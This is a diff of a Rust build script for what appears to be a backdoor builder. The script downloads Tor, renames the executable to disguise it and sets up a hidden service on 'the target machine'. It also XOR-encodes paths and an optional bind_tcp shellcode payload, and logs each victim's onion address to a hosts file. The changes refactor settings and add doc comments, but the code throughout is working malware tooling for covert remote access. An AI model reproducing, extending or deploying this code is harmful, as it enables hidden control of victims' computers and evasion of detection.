@@ -9,16 +9,43 @@ const CFG_DESTINATION: &str = "src/config.rs";
 const CFG_SETTINGS: &str = "settings.json";
 
 struct BuildSetting {
-    hosts_file: PathBuf,
-    is_tor_for_windows: bool,
-    key: String,
-    windows_url: String,
-    windows_dir: String,
-    linux_url: String,
-    linux_dir: String,
-    torrc: String,
+    /// Name to identify the host when connecting to it later
     name: String,
+
+    /// Which file to save information about
+    hosts_file: PathBuf,
+
+    /// Whether or not the target is a Windows NT machine
+    is_tor_for_windows: bool,
+
+    /// XOR encryption key
+    key: String,
+
+    /// Download url for windows
+    windows_url: String,
+
+    /// Destination directory for windows
+    windows_dir: String,
+
+    /// Download url for linux
+    linux_url: String,
+
+    /// Destination directory for linux
+    linux_dir: String,
+
+    /// Torrc file to bundle
+    torrc_file: String,
+
+    /// Executable name of tor in target machine
+    tor_executable: String,
+    
+    /// Whether or not to use shellcode like payload
+    uses_payload: bool,
+
+    /// Payload to execute. The supported payload is bind_tcp ones
     payload_data: String,
+
+    /// If using a bind_tcp payload, what port the payload will listen
     payload_port: String,
 }
 
@@ -28,7 +55,7 @@ fn main() -> Result<(), Box<dyn error::Error>> {
     let setting = parse_settings(&raw_settings);
     println!("cargo:rerun-if-changed={}", CFG_SETTINGS);
 
-    let mut torrc = fs::read_to_string(&setting.torrc)?;
+    let mut torrc = fs::read_to_string(&setting.torrc_file)?;
 
     let platform_tor_dir;
 
@@ -43,11 +70,11 @@ ControlSocket @{CTRL_SOCKET}
 "#;
     }
 
-    let tor_dir = Path::new(&platform_tor_dir).join(&setting.name).join("App");
+    let tor_dir = Path::new(&platform_tor_dir).join(&setting.tor_executable).join("App");
 
     let mut replacements = collections::HashMap::new();
 
-    replacements.insert("@{NAME}", setting.name.clone());
+    replacements.insert("@{NAME}", setting.tor_executable.clone());
     replacements.insert("@{ENC_KEY}", setting.key.clone());
 
     let enc_tor_dir = xor::encode(&setting.key, &String::from(tor_dir.to_str().unwrap()));
@@ -58,15 +85,15 @@ ControlSocket @{CTRL_SOCKET}
 
     replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);
 
-    let enc_payload_data = if &setting.payload_data == "" {
-        String::from("")
-    } else {
+    let enc_payload_data = if setting.uses_payload {
         if &setting.payload_port == "" {
             return Err(String::from("payload port is required").into());
         }
 
         let bytes: Vec<u8> = Vec::from_hex(&setting.payload_data)?;
         xor::encode_bytes(&setting.key, &bytes)
+    } else {
+        String::from("")
     };
 
     replacements.insert("@{ENC_PAYLOAD_DATA}", enc_payload_data);
@@ -104,7 +131,7 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
     dump_victim(hs_addr, &setting)?;
 
     let mut archive = tar::Builder::new(Vec::new());
-    archive.append_dir_all(&setting.name, &dir)?;
+    archive.append_dir_all(&setting.tor_executable, &dir)?;
 
     let data = archive.into_inner()?;
 
@@ -114,13 +141,14 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
 
 fn dump_victim(address: String, setting: &BuildSetting) -> Result<(), Box<dyn error::Error>> {
     let mut hosts = match fs::read_to_string(&setting.hosts_file) {
-        Ok(data) => json::parse(&data)?,
+        Ok(data) => json::parse(&data).expect(&format!("failed to read json at {}", &setting.hosts_file.to_str().unwrap())),
         Err(_) => json::JsonValue::new_array(),
     };
 
     let mut host = json::JsonValue::new_object();
     host["address"] = address.into();
-    host["uses_payload"] = (&setting.payload_data != "").into();
+    host["uses_payload"] = setting.uses_payload.into();
+    host["name"] = setting.name.clone().into();
 
     hosts.push(host)?;
     fs::write(&setting.hosts_file, hosts.pretty(4))?;
@@ -187,7 +215,7 @@ fn download_and_extract_tor(
 
         fs::rename(
             path.join("App").join("tor.exe"),
-            path.join("App").join(format!("{}.exe", &setting.name)),
+            path.join("App").join(format!("{}.exe", &setting.tor_executable)),
         )?;
 
         fs::rename(
@@ -232,6 +260,10 @@ fn replace_settings(
 }
 
 fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
+    let name = String::from(raw["name"].as_str().unwrap_or_else(|| {
+        panic!("invalid name setting");
+    }));
+
     let hosts_file = PathBuf::from(raw["hosts_file"].as_str().unwrap_or_else(|| {
         panic!("invalid hosts_file setting");
     }));
@@ -244,44 +276,56 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
         xor::secret_key()
     };
 
-    let windows_url = String::from(raw["tor_urls"]["windows"].as_str().unwrap_or_else(|| {
-        panic!("windows url must be a string");
+    let is_tor_for_windows = raw["tor"]["build_for_windows"].as_bool().unwrap_or(false);
+
+    let windows_url = String::from(raw["tor"]["download_url"]["windows"].as_str().unwrap_or_else(|| {
+        panic!("invalid windows download url");
     }));
 
-    let linux_url = String::from(raw["tor_urls"]["linux"].as_str().unwrap_or_else(|| {
-        panic!("linux url must be a string");
+    let linux_url = String::from(raw["tor"]["download_url"]["linux"].as_str().unwrap_or_else(|| {
+        panic!("invalid linux download url");
     }));
 
-    let windows_dir = String::from(raw["tor_dirs"]["windows"].as_str().unwrap_or_else(|| {
-        panic!("windows path must be a string");
+    let windows_dir = String::from(raw["tor"]["destination_dir"]["windows"].as_str().unwrap_or_else(|| {
+        panic!("invalid windows download directory");
     }));
 
-    let linux_dir = String::from(raw["tor_dirs"]["linux"].as_str().unwrap_or_else(|| {
-        panic!("linux path must be a string");
+    let linux_dir = String::from(raw["tor"]["destination_dir"]["linux"].as_str().unwrap_or_else(|| {
+        panic!("invalid linux destination directory");
     }));
 
-    let torrc = String::from(raw["torrc"].as_str().unwrap_or_else(|| {
-        panic!("torrc must be a string");
+    let torrc_file = String::from(raw["tor"]["rc_file"].as_str().unwrap_or_else(|| {
+        panic!("invalid torrc file");
     }));
 
-    let name = String::from(raw["name"].as_str().unwrap_or_else(|| {
-        panic!("name must be a string");
+    let tor_executable = String::from(raw["tor"]["executable"].as_str().unwrap_or_else(|| {
+        panic!("invalid tor executable name");
     }));
 
-    let payload_data = String::from(raw["payload"]["hex"].as_str().unwrap_or_else(|| ""));
+    let uses_payload = raw["payload"]["enabled"].as_bool().unwrap_or(false);
 
-    let payload_port = String::from(raw["payload"]["bind_port"].as_str().unwrap_or_else(|| ""));
+    let payload_data = if uses_payload {
+        String::from(raw["payload"]["hex"].as_str().unwrap_or_else(|| {
+            panic!("invalid payload setting")
+        }))
+    } else {
+        String::from("")
+    };
+
+    let payload_port = String::from(raw["payload"]["bind_port"].as_str().unwrap_or(""));
 
     BuildSetting {
+        name,
         hosts_file,
-        is_tor_for_windows: cfg!(feature = "tor_for_windows"),
+        is_tor_for_windows,
         key,
         windows_url,
         windows_dir,
         linux_url,
         linux_dir,
-        torrc,
-        name,
+        torrc_file,
+        tor_executable,
+        uses_payload,
         payload_data,
         payload_port,
     }
